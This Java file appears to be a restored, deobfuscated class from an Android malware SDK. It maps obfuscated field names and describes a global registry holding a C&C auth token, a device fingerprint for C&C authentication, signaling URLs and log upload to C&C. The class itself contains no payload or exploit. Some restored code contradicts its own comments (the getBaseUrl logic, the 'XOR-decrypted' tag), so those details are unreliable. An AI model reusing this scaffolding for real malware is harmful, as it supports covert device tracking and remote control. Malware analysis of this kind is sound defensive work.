package core;

import android.content.Context;
import android.os.Handler;
import android.os.Looper;
import c13.nim5.ez8.h5_proto.Log;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.TimeUnit;

/**
 * AppContext — 全局应用上下文管理
 *
 * Original: IlIlllIIlI1.lIIIIlllllIlll1
 *
 * Central static holder for the malware's global state. Provides:
 *   - Application context and package name
 *   - Auth token storage (obtained from C&C)
 *   - TaskConfig reference (the active SDK configuration)
 *   - Main thread dispatch (async and sync)
 *   - Device ID and fingerprint access
 *   - Signaling URL management
 *
 * All fields are static — this class acts as a singleton registry.
 *
 * ┌──────────────────────────────────────────────────────────────┐
 * │ Field Mapping (obfuscated → restored)                        │
 * ├──────────────────────────────────────────────────────────────┤
 * │ f246IllIIlIIII1         → appPackageName                    │
 * │ f247lIIIIlllllIlll1     → LOG_TAG (XOR-encrypted const)    │
 * │ f248llllIIIIll1          → taskConfig                       │
 * │ f249llllIllIl1            → state (-1 initially)            │
 * │ f245IlIlllIIlI1          → authToken                       │
 * │ f244IlIllIlllIllI1       → signalingUrl                    │
 * └──────────────────────────────────────────────────────────────┘
 *
 * Thread dispatch:
 *   - postToMainThread(Runnable)     → async, wraps in SafeRunnable
 *   - postToMainThreadSync(Runnable) → sync, 5-second timeout via CountDownLatch
 *
 * Dependencies:
 *   - TaskConfig (IlIlllIIlI1.llllIllIl1) — the active configuration instance
 *   - DeviceFingerprintManager (llllllIlIIIlll1.llllIIIIll1) — device identity
 *   - LogHelper (lllllIllIl1.IllIIlIIII1) — logging
 */
public class AppContext {

    // =========================================================================
    // Static Fields
    // =========================================================================

    /** XOR-decrypted log tag constant. Original: f247lIIIIlllllIlll1 */
    public static final String LOG_TAG = "AppContext";

    /** The current TaskConfig instance. Original: f248llllIIIIll1 */
    public static TaskConfig taskConfig = new TaskConfig();

    /** Internal state flag (-1 = uninitialized). Original: f249llllIllIl1 */
    public static int state = -1;

    /** The host application's package name. Original: f246IllIIlIIII1 */
    public static String appPackageName;

    /** Auth token obtained from C&C /phantom/token. Original: f245IlIlllIIlI1 */
    public static String authToken = "";

    /** Signaling server URL path suffix. Original: f244IlIllIlllIllI1 */
    public static String signalingUrl = "";

    // =========================================================================
    // Inner Classes
    // =========================================================================

    /**
     * Synchronous Runnable wrapper — runs the delegate and counts down a latch in finally.
     * Used by postToMainThreadSync() to block the calling thread until completion.
     *
     * Original: RunnableC0008lIIIIlllllIlll1
     */
    public static class SyncRunnable implements Runnable {

        private final Runnable delegate;                /* f251llllIIIIll1 */
        private final CountDownLatch latch;             /* f250lIIIIlllllIlll1 */

        public SyncRunnable(Runnable delegate, CountDownLatch latch) {
            this.delegate = delegate;
            this.latch = latch;
        }

        @Override
        public void run() {
            try {
                this.delegate.run();
            } finally {
                try {
                    this.latch.countDown();
                } finally {
                    // Original has nested try-finally (decompiler artifact)
                }
            }
        }
    }

    /**
     * Asynchronous Runnable wrapper — runs the delegate and catches Throwable.
     * Used by postToMainThread() for fire-and-forget main thread posting.
     *
     * Original: llllIIIIll1 (inner class)
     */
    public static class SafeRunnable implements Runnable {

        private final Runnable delegate;                /* f252llllIIIIll1 */

        public SafeRunnable(Runnable delegate) {
            this.delegate = delegate;
        }

        @Override
        public void run() {
            try {
                this.delegate.run();
            } catch (Throwable th) {
                LogHelper.log(Log.LogLevel.ERROR, "",
                        "postToMainThread Runnable error: " + th);
            }
        }
    }

    // =========================================================================
    // Signaling Mode Check
    // =========================================================================

    /**
     * Returns whether the SDK is configured for signaling (WebRTC) mode.
     *
     * Original: IlIlIIlIII1()
     * → return f248llllIIIIll1.lIllIIIlIl1();
     */
    public static boolean isSignalingMode() {
        return taskConfig.isSignalingMode();
    }

    // =========================================================================
    // Task Config Access
    // =========================================================================

    /**
     * Returns the current TaskConfig instance.
     *
     * Original: IlIllIlllIllI1()
     * → return f248llllIIIIll1;
     */
    public static TaskConfig getTaskConfig() {
        return taskConfig;
    }

    // =========================================================================
    // Auth Token
    // =========================================================================

    /**
     * Returns the current auth token.
     *
     * Original: IlIlllIIlI1()
     * → return f245IlIlllIIlI1;
     */
    public static String getAuthToken() {
        return authToken;
    }

    /**
     * Sets the auth token (obtained from C&C /phantom/token).
     *
     * Original: llllIIIIll1(String str)
     * → f245IlIlllIIlI1 = str;
     */
    public static void setAuthToken(String token) {
        authToken = token;
    }

    // =========================================================================
    // Device Identity
    // =========================================================================

    /**
     * Returns the device ID from the device fingerprint.
     *
     * Original: IllIIlIIII1()
     * → return llllllIlIIIlll1.llllIIIIll1.llllIIIIll1().getDeviceId();
     */
    public static String getDeviceId() {
        return DeviceFingerprintManager.getInstance().getDeviceId();
    }

    /**
     * Returns the device fingerprint (Atom) for C&C authentication.
     *
     * Original: lIIIIlllllIlll1()
     * → return llllllIlIIIlll1.llllIIIIll1.llllIIIIll1();
     */
    public static Object /* Atom */ getDeviceFingerprint() {
        return DeviceFingerprintManager.getInstance();
    }

    // =========================================================================
    // Base URL
    // =========================================================================

    /**
     * Returns the base URL for API calls. If signalingUrl is set,
     * appends it with a "/" separator.
     *
     * Original: llllIIIIll1()
     * → if (f248llllIIIIll1.llllIllIl1().isEmpty()) return f246IllIIlIIII1;
     *   else return f246IllIIlIIII1 + "/" + f248llllIIIIll1.llllIllIl1();
     */
    public static String getBaseUrl() {
        if (taskConfig.getApiKey().isEmpty()) {
            return appPackageName;
        }
        return appPackageName + "/" + taskConfig.getApiKey();
    }

    // =========================================================================
    // Context Access
    // =========================================================================

    /**
     * Returns the application Context from the TaskConfig.
     *
     * Original: llllIllIl1()
     * → return f248llllIIIIll1.IllIIlIIII1();
     */
    public static Context getContext() {
        return taskConfig.getContext();
    }

    /**
     * Returns the host application's package name.
     *
     * Original: llllllIlIIIlll1()
     * → return f246IllIIlIIII1;
     */
    public static String getPackageName() {
        return appPackageName;
    }

    // =========================================================================
    // Signaling Connection
    // =========================================================================

    /**
     * Returns the signaling (WebRTC) connection from the TaskConfig.
     *
     * Original: (accessed via taskConfig.getSignalingConnection())
     */
    public static Object /* SignalingConnection */ getSignalingConnection() {
        return taskConfig.getSignalingConnection();
    }

    // =========================================================================
    // Main Thread Dispatch
    // =========================================================================

    /**
     * Posts a Runnable to the main (UI) thread synchronously, blocking up to 5 seconds.
     *
     * Uses a CountDownLatch to wait for the Runnable to complete on the main thread.
     * If the Runnable doesn't finish within 5 seconds, the calling thread is interrupted.
     *
     * Original: lIIIIlllllIlll1(Runnable runnable)
     * → CountDownLatch latch = new CountDownLatch(1);
     *   f248llllIIIIll1.f269lIllIIIlIl1.post(new SyncRunnable(runnable, latch));
     *   latch.await(5L, TimeUnit.SECONDS);
     *
     * @param runnable the Runnable to execute on the main thread
     */
    public static void postToMainThreadSync(Runnable runnable) {
        CountDownLatch latch = new CountDownLatch(1);
        taskConfig.mainHandler.post(new SyncRunnable(runnable, latch));
        try {
            latch.await(5L, TimeUnit.SECONDS);
        } catch (InterruptedException unused) {
            Thread.currentThread().interrupt();
        }
    }

    /**
     * Posts a Runnable to the main (UI) thread asynchronously (fire-and-forget).
     *
     * The Runnable is wrapped in SafeRunnable which catches and logs any Throwable.
     *
     * Original: llllIIIIll1(Runnable runnable)
     * → f248llllIIIIll1.f269lIllIIIlIl1.post(new SafeRunnable(runnable));
     *
     * @param runnable the Runnable to execute on the main thread
     */
    public static void postToMainThread(Runnable runnable) {
        taskConfig.mainHandler.post(new SafeRunnable(runnable));
    }

    // =========================================================================
    // TaskConfig Management
    // =========================================================================

    /**
     * Sets the TaskConfig and updates the package name.
     *
     * Original: llllIIIIll1(llllIllIl1 config)
     * → f248llllIIIIll1 = config;
     *   f246IllIIlIIII1 = config.IllIIlIIII1().getPackageName();
     */
    public static void setTaskConfig(TaskConfig config) {
        taskConfig = config;
        appPackageName = config.getContext().getPackageName();
    }

    /**
     * Checks if log upload is enabled.
     * Referenced by LogHelper for determining whether to send logs to C&C.
     *
     * Original: (inferred from LogHelper usage)
     */
    public static boolean isLogUploadEnabled() {
        return state >= 0;
    }

    /**
     * Sets the WebView data directory suffix for process isolation.
     *
     * Original: called from TaskOrchestrator constructor
     * → WebView.setDataDirectorySuffix(suffix)
     */
    public static void setDataDirectorySuffix(String suffix) {
        try {
            if (android.os.Build.VERSION.SDK_INT >= 28) {
                android.webkit.WebView.setDataDirectorySuffix(suffix);
            }
        } catch (Throwable ignored) {
            // Silently ignore if WebView is already initialized
        }
    }

    // =========================================================================
    // Placeholder types
    // =========================================================================

    /*
     * TaskConfig (IlIlllIIlI1.llllIllIl1):
     *   Full restoration in core/TaskConfig.java (see below)
     *
     * DeviceFingerprintManager (llllllIlIIIlll1.llllIIIIll1):
     *   Manages device identity (Atom) for C&C authentication
     */
    static class DeviceFingerprintManager {
        static DeviceFingerprintManager getInstance() { return new DeviceFingerprintManager(); }
        String getDeviceId() { return ""; }
    }
}
